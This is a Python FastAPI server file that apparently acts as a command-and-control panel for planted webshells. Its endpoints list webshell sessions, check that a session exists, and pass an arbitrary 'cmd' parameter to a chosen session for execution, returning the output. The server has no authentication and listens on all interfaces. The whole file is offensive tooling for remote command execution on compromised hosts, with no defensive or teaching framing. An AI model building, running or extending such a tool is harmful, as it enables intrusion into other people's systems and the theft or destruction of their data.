from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles
from fastapi.responses import RedirectResponse
import session_manager
from session.session import Session

app = FastAPI()

app.mount("/public", StaticFiles(directory="public"), name="public")

@app.get("/find_webshell")
async def find_webshell(webshell_id: str):
    print(webshell_id)
    session: Session = session_manager.get_session_by_id(webshell_id)
    return {
        "code": 0,
        "data": session is not None
    }

@app.get("/webshell_execute_cmd")
async def webshell_execute_cmd(webshell_id: str, cmd: str):
    session: Session = session_manager.get_session_by_id(webshell_id)
    if session is None:
        return {
            "code": -400,
            "msg": "No such session"
        }
    result = session.execute_cmd(cmd)
    if result is None:
        return {
            "code": -400,
            "msg": "Execute Failed"
        }
    return {
        "code": 0,
        "data": result
    }

@app.get("/list_webshell")
async def list_webshell():
    return {
        "code": 0,
        "data": session_manager.list_sessions_readable()
    }

@app.get("/")
async def hello_world():
    return RedirectResponse("/public/index.html")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("__main__:app", host="0.0.0.0", port=8000, reload=True)

